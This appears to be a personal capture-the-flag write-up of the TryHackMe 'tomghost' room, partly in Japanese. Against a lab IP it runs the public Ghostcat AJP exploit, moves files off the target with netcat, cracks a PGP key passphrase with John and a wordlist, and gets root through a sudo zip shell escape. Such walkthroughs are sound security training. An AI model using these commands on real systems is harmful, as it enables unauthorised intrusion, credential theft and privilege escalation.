## tomghost
https://tryhackme.com/room/tomghost

### Enum
👻

```
nmap -p 22,53,8009,8080 10.10.157.194 -Pn -sC -sV -T4 -A
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-16 01:03 JST
Nmap scan report for 10.10.157.194
Host is up (0.43s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Linux 3.13 (92%), Linux 3.13 - 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```
searchsploit ajp13
Exploits: No Results
Shellcodes: No Results

searchsploit Apache Tomcat 9.0.30
Exploits: No Results
Shellcodes: No Results

searchsploit ajp
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
AjPortal2Php - 'PagePrefix' Remote File Inclusion              | php/webapps/3752.txt
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion              | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit | multiple/webapps/49039.rb
--------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

searchsploit -x 48143.py
cp /usr/share/exploitdb/exploits/multiple/webapps/48143.py 48143.py
```

```
python 48143.py 10.10.157.194
Getting resource at ajp13://10.10.157.194:8009/asdf
```
![キャプチャ](https://user-images.githubusercontent.com/6504854/179383809-92cd5bc1-5d27-4fc8-87b5-02c66a728b53.PNG)

### Flag

```
ssh *******@10.10.157.194
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```
```
gpg --import tryhackme.asc
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

skyfuck@ubuntu:~$ gpg -o cred1 -d credential.pgp

You need a passphrase to unlock the secret key for
```
👻 I need to get key for decrypt pgp.
```
skyfuck@ubuntu:~$ nc -l 1111 < tryhackme.asc
```
```
nc 10.10.157.194 1111 > tryhackme.asc
```
```
skyfuck@ubuntu:~$ nc -l 1111 < credential.pgp
```
```
nc 10.10.157.194 1111 > credential.pgp
```
```
gpg2john tryhackme.asc > hashthm

john hashthm -w=/usr/share/wordlists/rockyou.txt

a*******        (tryhackme)
Session completed.
```
```
skyfuck@ubuntu:~$ gpg -o cred1 -d credential.pgp
cat cred1
su merlin
```

```
merlin@ubuntu $ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

```
merlin@ubuntu:/home/skyfuck$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
```

👻Appache ajp あじゃぱー(8009)いたらTomcatGhost使えることがある。あじゃぱー。

https://tomcat.apache.org/tomcat-4.1-doc/config/ajp13.html

自分で０からアップロードスクリプト作ろうとしたけどうまくプロキシ通せなくて挫折した

👻今回はpolkitつかわないで頑張ったYo

